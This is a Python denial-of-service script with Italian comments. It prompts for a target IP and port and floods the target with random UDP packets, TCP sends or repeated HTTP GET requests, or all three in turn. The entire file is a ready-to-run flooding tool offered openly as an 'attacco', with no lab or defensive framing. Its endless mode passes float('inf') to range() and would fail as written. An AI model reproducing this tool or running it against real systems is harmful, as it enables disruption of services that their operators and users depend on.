#socket: Per creare e gestire le connessioni TCP/UDP.
#random: Per generare pacchetti di byte casuali (usati per il payload dei pacchetti).
#requests: Per inviare richieste HTTP con payload (nel caso dell'attacco HTTP).
import socket
import random
import requests

# Funzione per generare un pacchetto di 1 KB
def generate_packet():
    return random._urandom(1024)  # Genera 1 KB di byte casuali

# Funzione per eseguire l'attacco UDP flood
def udp_flood(target_ip, target_port, num_packets):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Creiamo un socket UDP
    packet = generate_packet()  # Generiamo un pacchetto di 1 KB

    print(f"Inizio invio di {num_packets} pacchetti UDP verso {target_ip}:{target_port}...")

    try:
        for _ in range(num_packets):
            sock.sendto(packet, (target_ip, target_port))  # Invia il pacchetto alla destinazione
    except KeyboardInterrupt:
        print("\nAttacco UDP interrotto manualmente.")
    finally:
        sock.close()

# Funzione per eseguire l'attacco TCP flood
def tcp_flood(target_ip, target_port, num_packets):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Creiamo un socket TCP

    try:
        sock.connect((target_ip, target_port))  # Connessione TCP
        print(f"Connessione TCP stabilita con {target_ip}:{target_port}...")
        packet = generate_packet()  # Generiamo un pacchetto di 1 KB

        for _ in range(num_packets):
            try:
                sock.send(packet)  # Invia pacchetto TCP
            except KeyboardInterrupt:
                print("\nAttacco TCP interrotto manualmente.")
                break
    except Exception as e:
        print(f"Errore nella connessione TCP: {e}")
    finally:
        sock.close()

# Funzione per eseguire l'invio di richieste HTTP
def http_flood(target_ip, target_port, num_packets):
    url = f"http://{target_ip}:{target_port}/"
    print(f"Inizio invio di {num_packets} richieste HTTP verso {url}...")

    try:
        for _ in range(num_packets):
            try:
                response = requests.get(url)  # Effettua una richiesta GET HTTP
                print(f"Risposta: {response.status_code}")
            except KeyboardInterrupt:
                print("\nAttacco HTTP interrotto manualmente.")
                break
            except Exception as e:
                print(f"Errore nell'invio della richiesta HTTP: {e}")
    except KeyboardInterrupt:
        print("\nAttacco HTTP interrotto.")

# Funzione principale per ottenere input dall'utente
def main():
    # Richiedi input dall'utente per l'IP e la porta target
    target_ip = input("Inserisci l'IP della macchina target: ")
    target_port = int(input("Inserisci la porta della macchina target: "))

    # Chiedi all'utente quale tipo di pacchetti inviare
    protocol = input("Scegli il protocollo (tcp/udp/http) o lascia vuoto per inviare tutti: ").lower()

    # Chiedi all'utente il numero di pacchetti da inviare
    num_packets = input("Inserisci il numero di pacchetti da inviare (lascia vuoto per invio continuo): ")

    if num_packets == '':
        num_packets = float('inf')  # Invia pacchetti in modo continuo
    else:
        num_packets = int(num_packets)

    # Esegui l'attacco in base al protocollo scelto
    if protocol == "udp":
        udp_flood(target_ip, target_port, num_packets)
    elif protocol == "tcp":
        tcp_flood(target_ip, target_port, num_packets)
    elif protocol == "http":
        http_flood(target_ip, target_port, num_packets)
    elif protocol == '':  # Se l'utente non ha selezionato nessun protocollo
        print("Nessun protocollo selezionato, invio tutti i protocolli (TCP, UDP, HTTP)...")
        udp_flood(target_ip, target_port, num_packets)
        tcp_flood(target_ip, target_port, num_packets)
        http_flood(target_ip, target_port, num_packets)
    else:
        print("Protocollo non supportato. Scegli tra tcp, udp, http o lascia vuoto per inviare tutti.")

if __name__ == "__main__":
    main()

